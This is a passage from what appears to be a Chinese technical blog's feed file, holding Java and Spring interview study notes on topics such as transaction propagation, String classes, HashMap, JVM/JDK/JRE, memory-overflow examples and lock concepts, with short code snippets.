src="image-20200406163734578.png" alt></p><h2><span id="spring里代理模式的实现">Spring里代理模式的实现</span></h2><p>Ø 真实实现类的逻辑包含在getBean方法里</p><p>Ø getBean方法返回的实际上是Proxy的实例</p><p>Ø Proxy实例是Spring采用JDK Proxy或Cglib动态生成的</p><p><img src="image-20200406163746413.png" alt></p><h2><span id="事务传播">事务传播</span></h2><p>1.PROPAGATION_REQUIRED(默认实现)：当前没有事务则新建事务，有则加入当前事务</p><p>2.PROPAGATION_SUPPORTS：支持当前事务，如果当前没有事务则以非事务方式执行</p><p>3.PROPAGATION_MANDATORY：使用当前事务，如果没有则抛出异常</p><p>4.PROPAGATION__REQUIRES_NEW：新建事务，如果当前有事务则把当前事务挂起</p><p>5.PROPAGATION_NOT_SUPPORTED：以非事务的方式执行，如果当前有事务则把当前事务挂起</p><p>6.PROPAGATION_NEVER：以非事务的方式执行，如果当前有事务则抛出异常</p><p>7.PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行，如果当前没有事务，则执行1</p><table><thead><tr><th>隔离级别</th><th>描述</th></tr></thead><tbody><tr><td>DEFAULT</td><td>使用数据库本身使用的隔离级别 ORACLE（读已提交） MySQL（可重复读）</td></tr><tr><td>READ_UNCOMITTED</td><td>读未提交（脏读）最低的隔离级别，一切皆有可能。</td></tr><tr><td>READ_COMMITED</td><td>读已提交，ORACLE默认隔离级别，有幻读以及不可重复读风险。</td></tr><tr><td>REPEATABLE_READ</td><td>可重复读，解决不可重复读的隔离级别，但还是有幻读风险。</td></tr><tr><td>SERLALIZABLE</td><td>串行化，最高的事务隔离级别，不管多少事务，挨个运行完一个事务的所有子事务之后才可以执行另外一个事务里面的所有子事务，这样就解决了脏读、不可重复读和幻读的问题了</td></tr></tbody></table><h2><span id="什么是aop">什么是AOP</span></h2><p>在编译时，类加载时或运行时将通用代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础面试题</title>
      <link href="/2020/03/23/javaQA/"/>
      <url>/2020/03/23/javaQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理了网上的基础的Java面试题，对于一些题目有所删改，因为可能和之后写的文章重复。</p><a id="more"></a><!-- toc --><ul><li><a href="#面向对象的特点有哪些">面向对象的特点有哪些？</a></li><li><a href="#接口和抽象类有什么联系和区别">接口和抽象类有什么联系和区别</a></li><li><a href="#重载和重写有什么区别">重载和重写有什么区别</a></li><li><a href="#java有哪些基本数据类型">java有哪些基本数据类型？</a></li><li><a href="#int和integer有什么区别">int和Integer有什么区别</a></li><li><a href="#什么是自动拆装箱">什么是自动拆装箱</a></li><li><a href="#数组有没有length方法string有没有length方法">数组有没有length()方法？String有没有length()方法？</a></li><li><a href="#string和stringbuilder-stringbuffer的区别">String和StringBuilder、StringBuffer的区别？</a></li><li><a href="#string能被继承吗为什么">String能被继承吗？为什么？</a></li><li><a href="#什么是值传递和引用传递">什么是值传递和引用传递</a></li><li><a href="#java类的实例化顺序">Java类的实例化顺序</a></li><li><a href="#java中符号和有什么区别">Java中符号&gt;&gt;和&gt;&gt;&gt;有什么区别？</a></li><li><a href="#java集合框架的基础接口有哪些">Java集合框架的基础接口有哪些？</a></li><li><a href="#arraylist-和-linkedlist-有什么区别">ArrayList 和 LinkedList 有什么区别?</a></li><li><a href="#hashmap-与hashtable有什么区别">HashMap 与HashTable有什么区别</a><ul><li><a href="#hashtable"><strong>HashTable</strong></a></li><li><a href="#hashmap"><strong>HashMap</strong></a></li></ul></li><li><a href="#final-finally-finalize有什么区别">final, finally, finalize有什么区别</a></li><li><a href="#java中的throw-和-throws关键字有什么区别">java中的throw 和 throws关键字有什么区别？</a></li><li><a href="#oom原因有哪些如何解决">OOM原因有哪些，如何解决？</a></li><li><a href="#jdk8-新特性">JDK8 新特性</a></li><li><a href="#jvmjdk和jre有什么区别与联系">JVM，JDK和JRE有什么区别与联系</a></li><li><a href="#分别写出堆内存溢出与栈内存溢出的程序">分别写出堆内存溢出与栈内存溢出的程序</a></li><li><a href="#dump文件的作用是什么如何获取线程的dump文件">dump文件的作用是什么？如何获取线程的dump文件?</a></li><li><a href="#synchronized什么情况下会释放锁">synchronized什么情况下会释放锁</a></li><li><a href="#解释一下锁的一些基本概念可重入锁-可中断锁-公平锁-读写锁">解释一下锁的一些基本概念：可重入锁、可中断锁、公平锁、读写锁</a></li><li><a href="#java线程同步的方式有哪些">Java线程同步的方式有哪些</a></li><li><a href="#什么是线程安全">什么是线程安全？</a></li><li><a href="#java编写一个会导致死锁的程序">Java编写一个会导致死锁的程序？</a></li><li><a href="#简单介绍一下runnable和callable的区别和用法">简单介绍一下Runnable和Callable的区别和用法</a></li><li><a href="#java有哪几种创建多线程的方式">Java有哪几种创建多线程的方式？</a></li><li><a href="#cyclibarriar和countdownlatch有什么区别">CycliBarriar和CountdownLatch有什么区别?</a></li><li><a href="#线程池的作用有哪些">线程池的作用有哪些？</a></li><li><a href="#java-反射机制的作用">Java 反射机制的作用</a></li><li><a href="#反射机制有哪些优点和缺点">反射机制有哪些优点和缺点</a></li><li><a href="#反射创建类实例的三种方式">反射创建类实例的三种方式</a></li><li><a href="#jdk自带了哪些注解有什么作用">jdk自带了哪些注解，有什么作用</a></li><li><a href="#构造器constructor是否可被重写override">构造器（constructor）是否可被重写（override）</a></li><li><a href="#两个对象值相同xequalsy-true但却可有不同的hash-code这句话对不对">两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，这句话对不对？</a></li><li><a href="#char-型变量中能不能存贮一个中文汉字为什么">char 型变量中能不能存贮一个中文汉字，为什么？</a></li><li><a href="#介绍一下g1垃圾回收集器的特点及垃圾回收过程">介绍一下G1垃圾回收集器的特点，及垃圾回收过程</a></li></ul><!-- tocstop --><h2><span id="面向对象的特点有哪些">面向对象的特点有哪些？</span></h2><p>1.封装</p><p>在一个类的内部，某些属性和方法是私有的，不能被外界所访问。通过这种方式，对象对内部数据进行了不同级别的访问控制，就避免了程序中的无关部分的意外改变或错误改变了对象的私有部分。</p><p>2.继承</p><p>  继承实现了 IS-A 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。<br>继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。</p><p>3.多态</p><p> 多态分为编译时多态和运行时多态：<br>•    编译时多态主要指方法的重载（每个方法具有不同的参数的类型或参数的个数）<br>•    运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定<br>运行时多态有三个条件：<br>•    继承<br>•    覆盖（重写）<br>•    向上转型</p><p>4.抽象</p><p>提取现实世界中某事物的关键特性，为该事物构建模型的过程。得到的抽象模型中一般包含：属性（数据）和方法（行为）。这个抽象模型我们称之为类。对类进行实例化得到对象。</p><h2><span id="接口和抽象类有什么联系和区别">接口和抽象类有什么联系和区别</span></h2><p><strong>相同点：</strong></p><p>（1）都不能被实例化</p><p>（2）接口的实现类或抽象类的子类都只有实现了接口或抽象类中的方法后才能实例化。</p><p><strong>不同点：</strong></p><p>（1） 接口里只能包含抽象方法，静态方法和默认方法，不能为普通方法提供方法实现，抽象类则完全可以包含普通方法。</p><p>（2） 接口里只能定义静态常量，不能定义普通成员变量，抽象类里则既可以定义普通成员变量，也可以定义静态常量。</p><p>（3） 接口不能包含构造器，抽象类可以包含构造器，抽象类里的构造器并不是用于创建对象，而是让其子类调用这些构造器来完成属于抽象类的初始化操作。</p><p>（4） 接口里不能包含初始化块，但抽象类里完全可以包含初始化块。</p><p>（5） 一个类最多只能有一个直接父类，但一个类可以直接实现多个接口。</p><h2><span id="重载和重写有什么区别">重载和重写有什么区别</span></h2><p><strong>override（重写）</strong></p><ol><li><p>方法名、参数、返回值相同。</p></li><li><p>子类方法不能缩小父类方法的访问权限。</p></li><li><p>子类方法不能抛出比父类方法更多的异常(但子类方法可以不抛出异常)。</p></li><li><p>存在于父类和子类之间。</p></li><li><p>方法被定义为final不能被重写。</p></li></ol><p><strong>overload（重载）</strong></p><ol><li><p>参数类型、个数、顺序至少有一个不相同。</p></li><li><p>不能重载只有返回值不同的方法名。</p></li><li><p>存在于父类和子类、同类中。</p></li></ol><h2><span id="java有哪些基本数据类型">java有哪些基本数据类型？</span></h2><p>整数类型：</p><p>byte（1B） short（2B）int（4B）long（8B）</p><p>浮点类型：</p><p>float（4B）double（8B）</p><p>字符类型：</p><p>char（2B）</p><p>布尔类型：</p><p>boolean</p><h2><span id="int和integer有什么区别">int和Integer有什么区别</span></h2><p>int 是基本数据类型<br>Integer是其包装类，注意是一个类。<br>为什么要提供包装类呢？？？<br>一是为了在各种类型间转化，通过各种方法的调用。否则 你无法直接通过变量转化。<br>比如，现在int要转为String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">String result=Integer.toString(a);</span><br></pre></td></tr></table></figure><p>在java中包装类，比较多的用途是用在于各种数据类型的转化中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/通过包装类来实现转化的</span><br><span class="line"><span class="keyword">int</span> num=Integer.valueOf(<span class="string">"12"</span>);</span><br><span class="line"><span class="keyword">int</span> num2=Integer.parseInt(<span class="string">"12"</span>);</span><br><span class="line"><span class="keyword">double</span> num3=Double.valueOf(<span class="string">"12.2"</span>);</span><br><span class="line"><span class="keyword">double</span> num4=Double.parseDouble(<span class="string">"12.2"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//其他的类似。通过基本数据类型的包装来的valueOf和parseXX来实现String转为XX</span></span><br><span class="line">String a=String.valueOf(<span class="string">"1234"</span>);<span class="comment">//这里括号中几乎可以是任何类型</span></span><br><span class="line">String b=String.valueOf(<span class="keyword">true</span>);</span><br><span class="line">String c=<span class="keyword">new</span> Integer(<span class="number">12</span>).toString();<span class="comment">//通过包装类的toString()也可以</span></span><br><span class="line">String d=<span class="keyword">new</span> Double(<span class="number">2.3</span>).toString();</span><br></pre></td></tr></table></figure><h2><span id="什么是自动拆装箱">什么是自动拆装箱</span></h2><p>首先知道String是引用类型不是基本类型，引用类型声明的变量是指该变量在内存中实际存储的是一个引用地址，实体在堆中。引用类型包括类、接口、数组等。String类还是final修饰的。</p><p>而包装类就属于引用类型，<font color="red">自动装箱和拆箱就是基本类型和引用类型之间的转换</font>，至于为什么要转换，因为基本类型转换为引用类型后，就可以new对象，从而<font color="blue">调用包装类中封装好的方法</font>进行基本类型之间的转换或者toString（当然用类名直接调用也可以，便于一眼看出该方法是静态的），还有就是如果集合中想存放基本类型，<font color="orange">泛型的限定类型只能是对应的包装类型</font>。</p><h2><span id="数组有没有length方法string有没有length方法">数组有没有length()方法？String有没有length()方法？</span></h2><p>1、数组没有length()方法，但有length属性</p><p>2、String类有length() 方法</p><h2><span id="string和stringbuilder-stringbuffer的区别">String和StringBuilder、StringBuffer的区别？</span></h2><p>1、String 字符串常量(final修饰，不可被继承)，String是常量，当创建之后即不能更改。(可以通过StringBuffer和StringBuilder创建String对象(常用的两个字符串操作类)。)</p><p>2、StringBuffer 字符串变量（线程安全）,其也是final类别的，不允许被继承，其中的绝大多数方法都进行了同步处理，包括常用的Append方法也做了同步处理(synchronized修饰)。其自jdk1.0起就已经出现。其toString方法会进行对象缓存，以减少元素复制开销。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (toStringCache == <span class="keyword">null</span>) &#123;        </span><br><span class="line">        toStringCache = Arrays.copyOfRange(value, <span class="number">0</span>, count);    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(toStringCache, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、StringBuilder 字符串变量（非线程安全）其自jdk1.5起开始出现。与StringBuffer一样都继承和实现了同样的接口和类，方法除了没使用synch修饰以外基本一致，不同之处在于最后toString的时候，会直接返回一个新对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;<span class="comment">// Create a copy, don’t share the arrayreturn new String(value, 0, count);&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="string能被继承吗为什么">String能被继承吗？为什么？</span></h2><p>不可以，因为String类有final修饰符，而final修饰的类是不能被继承的，实现细节不允许改变。平常我们定义的String str=”a”;其实和String str=new String(“a”)还是有差异的。</p><p>前者默认调用的是String.valueOf来返回String实例对象，至于调用哪个则取决于你的赋值，比如String num=1,调用的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;<span class="keyword">return</span> Integer.toString(i);&#125;</span><br></pre></td></tr></table></figure><p>后者则是调用如下部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">String</span><span class="params">(String original)</span> </span>&#123;<span class="keyword">this</span>.value = original.value;<span class="keyword">this</span>.hash = original.hash;&#125;</span><br></pre></td></tr></table></figure><p>最后我们的变量都存储在一个char数组中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> value[];</span><br></pre></td></tr></table></figure><h2><span id="什么是值传递和引用传递">什么是值传递和引用传递</span></h2><p>值传递是对基本型变量而言的,传递的是该变量的一个副本,改变副本不影响原变量.<br>引用传递一般是对于对象型变量而言的,传递的是该对象地址的一个副本, 并不是原对象本身 。<br>一般认为,java内基本类型的传递都是值传递. java中实例对象的传递是引用传递 。</p><h2><span id="java类的实例化顺序">Java类的实例化顺序</span></h2><p>1． 父类静态成员和静态初始化块 ，按在代码中出现的顺序依次执行<br>2． 子类静态成员和静态初始化块 ，按在代码中出现的顺序依次执行<br>3． 父类实例成员和实例初始化块 ，按在代码中出现的顺序依次执行<br>4． 父类构造方法<br>5． 子类实例成员和实例初始化块 ，按在代码中出现的顺序依次执行<br>6． 子类构造方法</p><p>结论：对象初始化的顺序，先静态方法，再构造方法，每个又是先基类后子类。</p><h2><span id="java中符号gtgt和gtgtgt有什么区别">Java中符号&gt;&gt;和&gt;&gt;&gt;有什么区别？</span></h2><p>&gt;&gt;：带符号右移。正数右移高位补0，负数右移高位补1。比如：</p><p>4 &gt;&gt; 1，结果是2；-4 &gt;&gt; 1，结果是-2。-2 &gt;&gt; 1，结果是-1。</p><p>&gt;&gt;&gt;：无符号右移。无论是正数还是负数，高位通通补0。</p><p>对于正数而言，&gt;&gt;和&gt;&gt;&gt;没区别。</p><p>对于负数而言，-2 &gt;&gt;&gt; 1，结果是2147483647（Integer.MAX_VALUE），-1 &gt;&gt;&gt; 1，结果是2147483647（Integer.MAX_VALUE）。</p><h2><span id="java集合框架的基础接口有哪些">Java集合框架的基础接口有哪些？</span></h2><p>Collection：</p><p>为集合层级的根接口。一个集合代表一组对象，这些对象即为它的元素。Java平台不提供这个接口任何直接的实现。</p><p>Set：</p><p>是一个不能包含重复元素的集合。这个接口对数学集合抽象进行建模，被用来代表集合，就如一副牌。</p><p>List：</p><p>是一个有序集合，可以包含重复元素。你可以通过它的索引来访问任何元素。List更像长度动态变换的数组。</p><p>Map：</p><p>是一个将key映射到value的对象.一个Map不能包含重复的key：每个key最多只能映射一个value。</p><p>一些其它的接口有Queue、Dequeue、SortedSet、SortedMap和ListIterator。</p><h2><span id="arraylist-和-linkedlist-有什么区别">ArrayList 和 LinkedList 有什么区别?</span></h2><p>ArrayList和LinkedList都实现了List接口，有以下的不同点：</p><p>1、ArrayList是基于索引的数据接口，它的底层是数组。它可以以O(1)时间复杂度对元素进行随机访问。与此对应，LinkedList是以元素列表的形式存储它的数据，每一个元素都和它的前一个和后一个元素链接在一起，在这种情况下，查找某个元素的时间复杂度是O(n)。</p><p>2、相对于ArrayList，LinkedList的插入，添加，删除操作速度更快，因为当元素被添加到集合任意位置的时候，不需要像数组那样重新计算大小或者是更新索引。</p><p>3、LinkedList比ArrayList更占内存，因为LinkedList为每一个节点存储了两个引用，一个指向前一个元素，一个指向下一个元素。</p><h2><span id="hashmap-与hashtable有什么区别">HashMap 与HashTable有什么区别</span></h2><h3><span id="hashtable"><strong>HashTable</strong></span></h3><ul><li>底层数组+链表实现，无论key还是value都<strong>不能为null</strong>，线程<strong>安全</strong>，实现线程安全的方式是在修改数据时锁住整个HashTable，效率低，ConcurrentHashMap做了相关优化</li><li>初始size为<strong>11</strong>，扩容：newsize = olesize*2+1</li><li>计算index的方法：index = (hash &amp; 0x7FFFFFFF) % tab.length</li></ul><h3><span id="hashmap"><strong>HashMap</strong></span></h3><ul><li>底层数组+链表+红黑树实现，可<strong>以存储null键和null值</strong>，线程<strong>不安全</strong></li><li>初始size为<strong>16</strong>，扩容：newsize = oldsize*2，size一定为2的n次幂</li><li>扩容针对整个Map，每次扩容时，原来数组中的元素依次重新计算存放位置，并重新插入</li><li>当Map中元素总数超过Entry数组的75%，触发扩容操作，为了减少链表长度，元素分配更均匀</li><li>当链表长度超过8就会转换为红黑树，红黑树个数低于6就会转换成链表</li><li>计算index方法：index = hash &amp; (tab.length – 1)</li></ul><h2><span id="final-finally-finalize有什么区别">final, finally, finalize有什么区别</span></h2><p><strong>final</strong></p><p>修饰符（关键字）如果一个类被声明为final，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract的，又被声明为final的。将变量或方法声明为final，可以保证它们在使用中不被改变。被声明为final的变量必须在声明时给定初值，而在以后的引用中只能读取，不可修改。被声明为final的方法也同样只能使用，不能重载 。</p><p><strong>finally</strong></p><p>在异常处理时提供 finally 块来执行任何清除操作。如果抛出一个异常，那么相匹配的 catch 子句就会执行，然后控制就会进入 finally 块（如果有的话）。 </p><p><strong>finalize</strong></p><p>方法名。Java 技术允许使用 finalize() 方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在确定这个对象没有被引用时对这个对象调用的。它是在 Object类中定义的，因此所有的类都继承了它。子类覆盖 finalize() 方法以整理系统资源或者执行其他清理工作。finalize() 方法是在垃圾收集器删除对象之前对这个对象调用的。</p><h2><span id="java中的throw-和-throws关键字有什么区别">java中的throw 和 throws关键字有什么区别？</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            test(args);        </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;            </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (args == <span class="keyword">null</span> || args.length != <span class="number">1</span> || !<span class="string">"true"</span>.equals(args[<span class="number">0</span>])) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid argument!"</span>);        </span><br><span class="line">         &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别：</p><p>throw是语句抛出一个异常，一般是在代码块的内部，当程序出现某种逻辑错误时由程序员主动抛出某种特定类型的异常</p><p>throws是方法可能抛出异常的声明。(用在声明方法时，表示该方法可能要抛出异常)</p><h2><span id="oom原因有哪些如何解决">OOM原因有哪些，如何解决？</span></h2><p>首先，OOM 如果通俗点儿说，就是 JVM 内存不够用了。没有空闲内存，而且垃圾回收器也无法提供更多内存。</p><p>隐含的意思是在抛出OutOfMemoryError之前，通常垃圾回收器会被触发，尽其所能去清理出空间。</p><p>当然也不是在任何情况下垃圾回收器都会触发。比如我们分配一个超大对象，类似一个超大数组超过堆的最大值，JVM会判断垃圾回收并不能解决这个问题，所以直接抛出OutOfMemoryError。</p><p>除了程序计数器，其他区域都有可能会因为可能的空间不足产生OutOfMemoryError。总结如下：</p><ul><li><p>堆内存不足是常见的OOM原因之一OutOfMemoryError：Java heap space原因有很多，比如内存泄漏、堆大小设置不足、JVM处理不及时、内存无法释放</p></li><li><p>Java 虚拟机栈和本地方法栈。比如写一段递归没有跳出条件。会不断压栈。导致StackOverFlowError</p><h2><span id="jdk8-新特性">JDK8 新特性</span></h2></li><li><p>Lambda表达式和函数式接口</p></li><li><p>接口的默认方法和静态方法</p></li><li><p>重复注解</p></li><li><p>Streams</p></li><li><p>使用元空间代替永久代</p></li></ul><h2><span id="jvmjdk和jre有什么区别与联系">JVM，JDK和JRE有什么区别与联系</span></h2><p><strong>1、JVM</strong></p><p>JVM是JavaVirtual Machine（Java虚拟机）的缩写，它是整个java实现跨平台的最核心的部分，所有的java程序会首先被编译为.class的类文件，这种类文件可以在虚拟机上执行，也就是说class并不直接与机器的操作系统相对应，而是经过虚拟机间接与操作系统交互，由虚拟机将程序解释给本地系统执行。JVM是Java平台的基础，和实际的机器一样，它也有自己的指令集，并且在运行时操作不同的内存区域。 JVM通过抽象操作系统和CPU结构，提供了一种与平台无关的代码执行方法，即与特殊的实现方法、主机硬件、主机操作系统无关。JVM的主要工作是解释自己的指令集（即字节码）到CPU的指令集或对应的系统调用，保护用户免被恶意程序骚扰。 JVM对上层的Java源文件是不关心的，它关注的只是由源文件生成的类文件（.class文件）。</p><p><strong>2、JRE</strong></p><p>JRE是java runtime environment（java运行环境）的缩写。光有JVM还不能让class文件执行，因为在解释class的时候JVM需要调用解释所需要的类库lib。在JDK的安装目录里你可以找到jre目录，里面有两个文件夹bin和lib,在这里可以认为bin里的就是jvm，<font color="red">lib中则是jvm工作所需要的类库，而jvm和lib和起来就称为jre</font>。所以，在你写完java程序编译成.class之后，你可以把这个.class文件和jre一起打包发给朋友，这样你的朋友就可以运行你写程序了（jre里有运行.class的java.exe）。JRE是Sun公司发布的一个更大的系统，它里面就有一个JVM。JRE就与具体的CPU结构和操作系统有关，是运行Java程序必不可少的（除非用其他一些编译环境编译成.exe可执行文件……），JRE的地位就象一台PC机一样，我们写好的Win32应用程序需要操作系统帮我们运行，同样的，我们编写的Java程序也必须要JRE才能运行。 也可以说JRE是提供给业余的人来直接使用运行编译后java程序的。</p><p><strong>3、JDK</strong></p><p>JDK是java development kit（java开发工具包）的缩写。每个做java开发的人都会先在机器上装一个JDK，那 让我们看一下JDK的安装目录。在目录下面有六个文件夹、一个src类库源码压缩包、和其他几个声明文件。其中，真正在运行java时起作用的是以下四个文件夹：bin、include、lib、jre。现在我们可以看出这样一个关系，JDK包含JRE，而JRE包含JVM。</p><p>bin: 最主要的是编译器(javac.exe)</p><p>include: java和JVM交互用的头文件</p><p>lib：类库 （java开发需要的类库）  </p><p>jre: java运行环境 </p><p><font color="red">（注意：这里的bin、lib文件夹和jre里的bin、lib是不同的）总的来说JDK是用于java程序的开发,而jre则是只能运行class而没有编译的功能。eclipse、idea等其他IDE有自己的编译器而不是用JDK bin目录中自带的，所以在安装时你会发现他们只要求你选jre路径就ok了。</font></p><h2><span id="分别写出堆内存溢出与栈内存溢出的程序">分别写出堆内存溢出与栈内存溢出的程序</span></h2><p>栈内存溢出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    f();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆内存溢出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Listlist = <span class="keyword">new</span> ArrayList&lt;&gt;();         </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;         </span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;            </span><br><span class="line">        list.add(<span class="keyword">new</span> String(i + <span class="string">""</span>));            </span><br><span class="line">        i++;        </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="dump文件的作用是什么如何获取线程的dump文件">dump文件的作用是什么？如何获取线程的dump文件?</span></h2><p>dump文件的作用：</p><p>死循环、死锁、阻塞、页面打开慢等问题，打线程dump是最好的解决问题的途径。因此，线程dump也就是线程堆栈。</p><p>获取到线程堆栈dump文件内容分两步：</p><p>（1）第一步：获取到线程的pid，Linux环境下可以使用ps -ef | grep java</p><p>（2）第二步：打印线程堆栈，可以通过使用jstack pid命令</p><h2><span id="synchronized什么情况下会释放锁">synchronized什么情况下会释放锁</span></h2><p>1）获取锁的线程执行完了该代码块，然后线程释放对锁的占有；</p><p>2）线程执行发生异常，此时JVM会让线程自动释放锁。</p><p>3)   调用wait方法,在等待的时候立即释放锁,方便其他的线程使用锁.</p><h2><span id="解释一下锁的一些基本概念可重入锁-可中断锁-公平锁-读写锁">解释一下锁的一些基本概念：可重入锁、可中断锁、公平锁、读写锁</span></h2><p><strong>1.可重入锁</strong></p><p>如果锁具备可重入性，则称作为可重入锁。像synchronized和ReentrantLock都是可重入锁，可重入性在我看来实际上表明了锁的分配机制：基于线程的分配，而不是基于方法调用的分配。举个简单的例子，当一个线程执行到某个synchronized方法时，比如说method1，而在method1中会调用另外一个synchronized方法method2，此时线程不必重新去申请锁，而是可以直接执行方法method2。</p><p>看下面这段代码就明白了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        method2();    </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> </span>&#123;             </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中的两个方法method1和method2都用synchronized修饰了，假如某一时刻，线程A执行到了method1，此时线程A获取了这个对象的锁，而由于method2也是synchronized方法，假如synchronized不具备可重入性，此时线程A需要重新申请锁。但是这就会造成一个问题，因为线程A已经持有了该对象的锁，而又在申请获取该对象的锁，这样就会线程A一直等待永远不会获取到的锁。</p><p>而由于synchronized和Lock都具备可重入性，所以不会发生上述现象。</p><p><strong>2.可中断锁</strong></p><p>可中断锁：顾名思义，就是可以相应中断的锁。</p><p>在Java中，synchronized就不是可中断锁，而Lock是可中断锁。如果某一线程A正在执行锁中的代码，另一线程B正在等待获取该锁，可能由于等待时间过长，线程B不想等待了，想先处理其他事情，我们可以让它中断自己或者在别的线程中中断它，这种就是可中断锁。在前面演示lockInterruptibly()的用法时已经体现了Lock的可中断性。</p><p><strong>3.公平锁</strong></p><p>公平锁：即尽量以请求锁的顺序来获取锁。比如同是有多个线程在等待一个锁，当这个锁被释放时，等待时间最久的线程（最先请求的线程）会获得该所，这种就是公平锁。</p><p>非公平锁：即无法保证锁的获取是按照请求锁的顺序进行的。这样就可能导致某个或者一些线程永远获取不到锁。</p><p>在Java中，synchronized就是非公平锁，它无法保证等待的线程获取锁的顺序。</p><p>而对于ReentrantLock和ReentrantReadWriteLock，它默认情况下是非公平锁，但是可以设置为公平锁。</p><p>我们可以在创建ReentrantLock对象时，通过以下方式来设置锁的公平性：</p><figure 